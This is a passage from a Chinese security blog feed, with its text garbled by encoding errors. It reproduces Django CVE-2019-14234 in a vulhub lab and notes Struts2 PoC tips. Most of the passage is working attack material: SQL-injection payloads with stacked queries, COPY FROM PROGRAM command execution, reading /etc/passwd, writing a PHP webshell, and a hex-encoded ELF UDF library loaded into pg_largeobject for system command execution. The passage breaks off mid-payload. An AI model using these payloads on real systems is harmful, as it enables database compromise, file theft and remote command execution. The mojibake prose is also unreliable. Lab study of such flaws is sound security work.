href="https://www.cnblogs.com/hayasi/category/869760.html" target="_blank" rel="noopener">Struts2 æºç åˆ†æ</a><br><a href="https://www.freebuf.com/vuls/168609.html" target="_blank" rel="noopener">Struts2è‘—åRCEæ¼æ´å¼•å‘çš„åå¹´ä¹‹æ€</a></p><hr><h1 id="tags"><a href="#tags" class="headerlink" title="tags"></a>tags</h1><h2 id="ç¼–ç é—®é¢˜"><a href="#ç¼–ç é—®é¢˜" class="headerlink" title="ç¼–ç é—®é¢˜"></a>ç¼–ç é—®é¢˜</h2><p>æ‰“<code>poc</code> çš„æ—¶å€™ï¼Œæœ€å¥½è‡ªå·±å¤šæ³¨æ„ä¸€ä¸‹ <code>Tomcat</code> çš„ç‰ˆæœ¬ï¼Œå¾ˆå¤šåœ¨ <code>Tomcat7</code> èƒ½ç›´æ¥æ‰“çš„ <code>poc</code>ï¼Œåœ¨8çš„ç‰ˆæœ¬å¯èƒ½ä¼šæŠ¥ <code>400</code>ï¼Œæˆ–è€…æ˜¯æ— å›æ˜¾ï¼Œä¸»è¦åŸå› æ˜¯ <code>\</code> <code>&#39;</code> <code>&quot;</code> è¿™ç§åœ¨ <code>path</code>æäº¤ä¼šè¢«wafï¼Œé€šå¸¸æƒ…å†µå¯ä»¥å°† <code>poc</code> è¿›è¡Œä¸€æ¬¡ <code>URLç¼–ç </code>ï¼Œç„¶åçœ‹æ˜¯å¦å¯ä»¥æ‰“è¿›å»<br>(å®åœ¨æ‰“pocæ— æ•ˆï¼Œé‚£å°±å¬å¤©å‘½å§ï¼Œæ¯•ç«Ÿé¬¼çŸ¥é“åˆ«äººçš„åå°æ€ä¹ˆæ­çš„ï¼Œé¬¼çŸ¥é“shellä¼šå¼¹åˆ°å“ªä¸ªä½ç½®ï¼‰</p><hr><h2 id="pocè§£æé—®é¢˜"><a href="#pocè§£æé—®é¢˜" class="headerlink" title="pocè§£æé—®é¢˜"></a>pocè§£æé—®é¢˜</h2><p>ä½¿ç”¨<code>S2-007</code>çš„<code>poc</code>æ—¶ï¼Œæ³¨æ„æ§åˆ¶<code>res[num]</code>å¤§å°ï¼Œæ³¨æ„ä¸è¦å°† <code>res</code> å¤§å°è¶…è¿‡å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå¦åˆ™ä¼šå›æ˜¾nullã€‚<br>(Buuå¤ç°çš„æ—¶å€™ï¼Œæµ‹åˆ° <code>res=new+byte[1314]</code> æ‰ç»™flag)</p><p><a href="https://github.com/zhzyker/exphub" target="_blank" rel="noopener">expå·¥å…·åº“</a></p>]]></content>
    
    <summary type="html">
    
      åˆ°ç›®å‰ä½ç½®struts2çš„æ¼æ´ç¼–å·å·²ç»åˆ°äº†S2-057ï¼Œä¸€ç›´æƒ³ç³»ç»Ÿçš„å­¦ä¹ ä¸‹Struts2çš„æ¼æ´ï¼Œä½†ç”±äºæœ€è¿‘æ—¶é—´æ¯”è¾ƒç´§ï¼Œä»¥åæœ‰ç©ºå†æ¥å¡«å‘äº†ã€‚
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="æ¸—é€" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14234 å¤ç°æŒ–å‘</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/18/CVE_2019_14234/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/18/CVE_2019_14234/</id>
    <published>2020-02-18T13:59:30.316Z</published>
    <updated>2020-03-29T04:15:47.664Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>åœ¨ <code>Django 1.11.x</code>ï¼ˆ1.11.23ä¹‹å‰ï¼‰ï¼Œ2.1.xï¼ˆ2.1.11ä¹‹å‰ï¼‰å’Œ2.2.xï¼ˆ2.2.4ä¹‹å‰ï¼‰ä¸­å‘ç°äº†ä¸€ä¸ªé—®é¢˜ã€‚ ç”±äº<code>shallow key</code>è½¬æ¢ä¸­çš„é”™è¯¯ï¼Œ<code>django.contrib.postgres.fields.JSONField</code> çš„å…³é”®å­—å’Œç´¢å¼•æŸ¥æ‰¾ä»¥åŠ <code>django.contrib.postgres.fields.HStoreField</code> çš„å…³é”®å­—æŸ¥æ‰¾å—åˆ°SQLæ³¨å…¥ã€‚ </p><a id="more"></a><p>ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡åœ¨ <code>key</code> æˆ–ç´¢å¼•åç§°ä¸­ä½¿ç”¨ <code>OR 1 = 1</code>æ¥åˆ©ç”¨æ¼æ´ï¼Œä½¿ç”¨ç‰¹åˆ¶çš„å­—å…¸å¹¶é€šè¿‡å­—å…¸æ‰©å±•å°†æ‰€æœ‰è®°å½•è¿”å›ç»™<code>** kwarg</code>ï¼Œä»¥å°†æ‰€æœ‰è®°å½•è¿”å›ç»™ <code>QuerySet.filter()</code> åŠŸèƒ½ã€‚</p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p>é¦–å…ˆå…ˆæ¥çœ‹ä¸€ä¸‹å®˜æ–¹çš„ä¿®å¤æªæ–½<br><a href="https://github.com/django/django/pull/11612/files" target="_blank" rel="noopener">Fixed #30664</a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1jsf4j30fj03yaa4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1jsf4j30fj03yaa4.jpg" class="lazyload"></a></p><p>åœ¨ <code>django/db/backends/postgresql/schema.py</code> ä¸­ï¼Œåˆ©ç”¨ <code>strip_quotes()</code> å‡½æ•°å°è£…ï¼Œå°†ä¼ é€’çš„å­—ç¬¦ä¸²ä¸­çš„ <code>&#39; (å¼•å·)</code> åˆ é™¤ï¼Œè¿”å›ç§»é™¤å­—ç¬¦ä¸²å¤´å°¾æŒ‡å®šçš„å­—ç¬¦ç”Ÿæˆçš„æ–°å­—ç¬¦ä¸²ï¼Œè¿›è¡Œä¼ å‚ã€‚</p><hr><p><a href="https://github.com/django/django/pull/11784/files" target="_blank" rel="noopener">Fixed #30769</a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1mp7aj30le06v0t2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1mp7aj30le06v0t2.jpg" class="lazyload"></a></p><p>ç„¶åå°† <code>django/contrib/postgres/fields/hstore.py</code> æ–‡ä»¶é‡Œé¢çš„ <code>KeyTransformç±»</code>çš„ <code>as_sql</code> å‡½æ•°ä¸­çš„ç›´æ¥ä¼ é€’å­—ç¬¦ä¸²æ”¹ä¸ºäº†å°† <code>self.key_name</code> å•ç‹¬ä½¿ç”¨æ•°ç»„è¿›è¡Œä¼ é€’,å…¶ä¸­ <code>%%</code> çš„æ„æ€ä¸º <code>è½¬æ¢è¯´æ˜ç¬¦</code>ï¼Œå…¶ä¸»è¦ä½œç”¨ä¸ºç›´æ¥è½¬åŒ–ä¸ºå•ä¸ª <code>%</code> ç¬¦å·è€Œä¸éœ€è¦å‚æ•°ã€‚ç±»ä¼¼äº <code>\\</code> å’Œ <code>\</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In[1]: "%%"%()</span><br><span class="line">Out[1]: '%'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</span></span><br><span class="line"></span><br><span class="line">In [2]: '%s %%s'%'test'</span><br><span class="line">Out[2]: 'test %s'</span><br></pre></td></tr></table></figure></div><hr><h2 id="å†çœ‹ä¸‹ä¸€ä¸ª"><a href="#å†çœ‹ä¸‹ä¸€ä¸ª" class="headerlink" title="å†çœ‹ä¸‹ä¸€ä¸ª"></a>å†çœ‹ä¸‹ä¸€ä¸ª</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1s09zj30m906t3yv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1s09zj30m906t3yv.jpg" class="lazyload"></a></p><p>åœ¨ <code>django/contrib/postgres/fields/jsonb.py</code> æ–‡ä»¶ä¸­å°†å¯¹ <code>self.key_name</code> å˜é‡çš„è¿”å›ç»Ÿä¸€æ”¹æˆäº†ä½¿ç”¨æ•°ç»„è¿›è¡Œè½¬æ¢ã€‚å¹¶ä¸”åæœŸåœ¨å•å…ƒæµ‹è¯•ä¸­åŠ å…¥äº†å¯¹ <code>JSONField</code>çš„SQLæ³¨å…¥æµ‹è¯•</p><hr><h1 id="é¶åœºå¤ç°"><a href="#é¶åœºå¤ç°" class="headerlink" title="é¶åœºå¤ç°"></a>é¶åœºå¤ç°</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794" target="_blank" rel="noopener">pç¥æµæ‰¹ï¼</a></p><p>è¿›å…¥ <code>http://ip:port/admin/vuln/collection/</code><br>ä¼ å‚ </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?detail__a%27b&#x3D;1</span><br></pre></td></tr></table></figure></div><p>ä¼šæ˜¾ç¤ºå°† <code>&#39;</code> åŒ…æ‹¬è¿›å»</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1lhptj30wt0fsjtg.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gc0wb1lhptj30wt0fsjtg.jpg" class="lazyload"></a></p><p>è¯´æ˜å¯ä»¥æ„å»ºæŸ¥è¯¢å­—æ®µ</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">id_contains&#x3D;admin</span><br><span class="line">name_contains&#x3D;admin</span><br><span class="line">flag_contains&#x3D;flag&#123;</span><br><span class="line"></span><br><span class="line">?detail__author&#39;+&#x3D;+&#39;&quot;a&quot;&#39;)--</span><br><span class="line">?detail__author%27+%3d+%27&quot;a&quot;%27)%20and%207778%3dCAST((SELECT%20version())%20AS%20NUMERIC)--</span><br><span class="line">?detail__author&#39;%3f&#39;a&#39;) OR 1%3d2%20 -- OR%20 (&quot;vuln_collection&quot;.&quot;detail&quot; -&gt; &#39;detail</span><br><span class="line">?detail__author&#39;%3f&#39;a&#39;) OR 1%3d2%20 %3bCREATE table cmd_exec(cmd_output text) -- OR%20 (&quot;vuln_collection&quot;.&quot;detail&quot; -&gt; &#39;detail</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> cmd_exec;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output <span class="built_in">text</span>);</span><br><span class="line">COPY cmd_exec FROM PROGRAM 'id';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> cmd_exec;</span><br></pre></td></tr></table></figure></div><h2 id="åˆ‡å‰²è„šæœ¬"><a href="#åˆ‡å‰²è„šæœ¬" class="headerlink" title="åˆ‡å‰²è„šæœ¬"></a>åˆ‡å‰²è„šæœ¬</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage:python "</span> + sys.argv[<span class="number">0</span>] + <span class="string">"inputfile"</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    fileobj = open(sys.argv[<span class="number">1</span>],<span class="string">'rb'</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fileobj.read():</span><br><span class="line">        sys.stdout.write(<span class="string">r'&#123;:02x&#125;'</span>.format(ord(b)))</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2048</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">    fileobj.close()</span><br></pre></td></tr></table></figure></div><p><code>PostgreSQL</code> æ˜¯ä¸€ä¸ªè‡ªç”±çš„å¯¹è±¡-å…³ç³»æ•°æ®åº“æœåŠ¡å™¨(æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ)</p><h2 id="åœ¨rootæƒé™ä¸‹ä¿®æ”¹æ•°æ®åº“å¯†ç "><a href="#åœ¨rootæƒé™ä¸‹ä¿®æ”¹æ•°æ®åº“å¯†ç " class="headerlink" title="åœ¨rootæƒé™ä¸‹ä¿®æ”¹æ•°æ®åº“å¯†ç "></a>åœ¨rootæƒé™ä¸‹ä¿®æ”¹æ•°æ®åº“å¯†ç </h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start//å¯åŠ¨æœåŠ¡</span><br><span class="line">su postgres<span class="comment">#åˆ‡æ¢åˆ°æ•°æ®åº“ç”¨æˆ·ä¸‹</span></span><br><span class="line">psql  postgres<span class="comment">#è¿›å…¥æ•°æ®åº“</span></span><br><span class="line">alter user postgres with password <span class="string">'postgres'</span> <span class="comment">#ä¿®æ”¹æ•°æ®åº“çš„å¯†ç ä¸ºï¼špostgres</span></span><br><span class="line">psql -h 127.0.0.1 -U postgres -W   ä½¿ç”¨å¸å·å¯†ç ç™»å…¥ç³»ç»Ÿ</span><br></pre></td></tr></table></figure></div><h2 id="æŸ¥çœ‹æ•°æ®ä¸­çš„ä¿¡æ¯"><a href="#æŸ¥çœ‹æ•°æ®ä¸­çš„ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹æ•°æ®ä¸­çš„ä¿¡æ¯"></a>æŸ¥çœ‹æ•°æ®ä¸­çš„ä¿¡æ¯</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\l  <span class="comment">#åˆ—å‡ºæ•°æ®åº“</span></span><br><span class="line">\du  <span class="comment">#åˆ—å‡ºæ•°æ®åº“çš„ç”¨æˆ·</span></span><br><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">'./'</span>);  <span class="comment">#åˆ—å‡ºç³»ç»Ÿç›®å½•åˆ—è¡¨(ä¸èƒ½æ˜¯ç»å¯¹è·¯å¾„)</span></span><br><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">'postgresql.auto.conf'</span>, <span class="number">0</span>, <span class="number">200</span>);  <span class="comment">#è¯»å–ç³»ç»Ÿæ–‡ä»¶</span></span><br></pre></td></tr></table></figure></div><h2 id="ä½¿ç”¨æ•°æ®åº“è·å–ç³»ç»Ÿä¿¡æ¯"><a href="#ä½¿ç”¨æ•°æ®åº“è·å–ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="ä½¿ç”¨æ•°æ®åº“è·å–ç³»ç»Ÿä¿¡æ¯"></a>ä½¿ç”¨æ•°æ®åº“è·å–ç³»ç»Ÿä¿¡æ¯</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwn(t <span class="built_in">TEXT</span>);</span><br><span class="line">copy pwn from '/etc/passwd';</span><br><span class="line"><span class="keyword">select</span> *<span class="keyword">from</span> pwn <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br></pre></td></tr></table></figure></div><h2 id="ä½¿ç”¨æ•°æ®åº“å†™æ–‡ä»¶"><a href="#ä½¿ç”¨æ•°æ®åº“å†™æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨æ•°æ®åº“å†™æ–‡ä»¶"></a>ä½¿ç”¨æ•°æ®åº“å†™æ–‡ä»¶</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> pwn (t <span class="built_in">TEXT</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> pwn(t) <span class="keyword">values</span> (<span class="string">'&lt;?php @system("$_GET[cmd]");?&gt;'</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pwn;</span><br><span class="line">copy pwn(t) to  '/tmp/cmd.php';</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> pwn;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">copy  (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br></pre></td></tr></table></figure></div><h2 id="ä½¿ç”¨æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#ä½¿ç”¨æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ä½¿ç”¨æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>ä½¿ç”¨æ•°æ®åº“æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h2><p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤éœ€è¦ç”¨åˆ° <code>udfåº“</code>ï¼Œ(è¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼mysql ææƒ)<br>åˆ›å»º <code>.so</code>ï¼Œæ‰§è¡Œè‡ªå·±éœ€è¦ç”¨çš„å‘½ä»¤</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, <span class="keyword">decode</span>(<span class="string">'7f454c4602010100000000000000000003003e0001000000d00d0000000000004000000000000000f82e0000000000000000000040003800070040001d001a000100000005000000000000000000000000000000000000000000000000000000fc16000000000000fc1600000000000000002000000000000100000006000000001e000000000000001e200000000000001e200000000000e002000000000000e80200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000ec14000000000000ec14000000000000ec140000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000001e000000000000001e200000000000001e200000000000000200000000000000020000000000000100000000000000040000001400000003000000474e5500bc18d001b8d1db33f56f9fa1d194c131375c6a5c00000000030000001d00000002000000070000008440030810890c99880c008dc84400001d0000002400000029000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900100c0000000000000000000000000000ec00000012000000000000000000000000000000000000001101000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008401000012000000000000000000000000000000000000007d0100001200000000000000000000000000000000000000ba00000012000000000000000000000000000000000000008a0100001200000000000000000000000000000000000000480100001200000000000000000000000000000000000000e400000012000000000000000000000000000000000000001f01000012000000000000000000000000000000000000001901000012000000000000000000000000000000000000007701000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000009f0000001200000000000000000000000000000000000000d300000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000007101000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000004d01000012000000000000000000000000000000000000000301000012000000000000000000000000000000000000006b0100001200000000000000000000000000000000000000400100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000eb00000010000000000000000000000000000000000000003b0100001200000000000000000000000000000000000000f100000012000c0031100000000000000d00000000000000ca00000012000c00bc0f0000000000007500000000000000a501000010001700e0202000000000000000000000000000c100000012000c00af0f0000000000000d00000000000000fa00000012000c003e100000000000002201000000000000b801000010001800e82020000000000000000000000000005e01000012000c007a1200000000000024020000000000002601000012000c0060110000000000000d000000000000008300000012000c00dd0e0000000000006200000000000000ac01000010001800e02020000000000000000000000000001000000012000900100c00000000000000000000000000002f01000012000c006d1100000000000000010000000000007500000012000c00d00e0000000000000d000000000000001600000012000d00a01400000000000000000000000000005501000012000c006d120000000000000d00000000000000a600000012000c003f0f0000000000007000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006d656d637079006368725f7074725f746f5f746578745f707472007374726c656e0070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, <span class="keyword">decode</span>(<span class="string">'616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164005f5f737461636b5f63686b5f6661696c006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e313400474c4942435f322e3400474c4942435f322e322e3500000000000200020000000200020002000300020002000200020002000000040000000200020002000200020002000200000000000200000002000100010001000100010001000100010001000100010001000100010001000100010003009b01000010000000000000009491960600000400bd010000100000001469690d00000300c801000010000000751a690900000200d201000000000000001e2000000000000800000000000000a00e000000000000081e2000000000000800000000000000600e000000000000d8202000000000000800000000000000d820200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000e0000000000000000000000e81f20000000000006000000180000000000000000000000f01f20000000000006000000190000000000000000000000f81f200000000000060000001a00000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000000b00000000000000000000006020200000000000070000000c00000000000000000000006820200000000000070000002500000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000f0000000000000000000000802020000000000007000000100000000000000000000000882020000000000007000000110000000000000000000000902020000000000007000000120000000000000000000000982020000000000007000000130000000000000000000000a02020000000000007000000140000000000000000000000a82020000000000007000000150000000000000000000000b02020000000000007000000160000000000000000000000b82020000000000007000000170000000000000000000000c020200000000000070000001b0000000000000000000000c820200000000000070000001c0000000000000000000000d020200000000000070000002c00000000000000000000004883ec08488b05c51320004885c07405e89b0100004883c408c3000000000000ff35d2132000ff25d41320000f1f4000ff25d21320006800000000e9e0ffffffff25ca1320006801000000e9d0ffffffff25c21320006802000000e9c0ffffffff25ba1320006803000000e9b0ffffffff25b21320006804000000e9a0ffffffff25aa1320006805000000e990ffffffff25a21320006806000000e980ffffffff259a1320006807000000e970ffffffff25921320006808000000e960ffffffff258a1320006809000000e950ffffffff2582132000680a000000e940ffffffff257a132000680b000000e930ffffffff2572132000680c000000e920ffffffff256a132000680d000000e910ffffffff2562132000680e000000e900ffffffff255a132000680f000000e9f0feffffff25521320006810000000e9e0feffffff254a1320006811000000e9d0feffffff25421320006812000000e9c0feffffff253a1320006813000000e9b0feffffff25321320006814000000e9a0feffffff252a1320006815000000e990feffffff25221320006816000000e980feffffff251a1320006817000000e970feffffff251a1220006690ff252a1220006690488d3d09132000488d0509132000554829f84889e54883f80e7615488b05e61120004885c074095dffe0660f1f4400005dc30f1f4000662e0f1f840000000000488d3dc9122000488d35c2122000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05b11120004885c0740c5dffe0660f1f8400000000005dc30f1f4000662e0f1f840000000000803d7912200000752748833d8711200000554889e5740c488b3d5a122000e845ffffffe848ffffff5dc6055012200001f3c30f1f4000662e0f1f840000000000488d3d690f200048833f00750be95effffff660f1f440000488b05291120004885c074e9554889e5ffd05de940ffffff554889e5488d05e50500005dc3554889e54883ec2048897de8488b45e88b00c1e80283e8048945f48b45f483c00148984889c7e818feffff488945f88b45f44863d0488b45e8488d4804488b45f84889ce4889c7e8d7fdffff8b45f44863d0488b45f84801d0c60000488b45f8c9c3554889e54883ec2048897de8488b45e84889c7e829fdffff4883c0044889c7e8bdfdffff488945f8488b45e84889c7e80dfdffff83c0048d148500000000488b45f88910488b45e84889c7e8f1fcffff4889c2488b45f8488d4804488b45e84889c64889cfe857fdffff488b45f8c9c3554889e5488d05220500005dc3554889e54883ec3048897dd8488b45d8488b40204889c7e838fdffff488945f0c745ec00000000488b45f04889c7e8f1fcffff488945f8488b45f84889c7e8b1fcffff89'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, <span class="keyword">decode</span>(<span 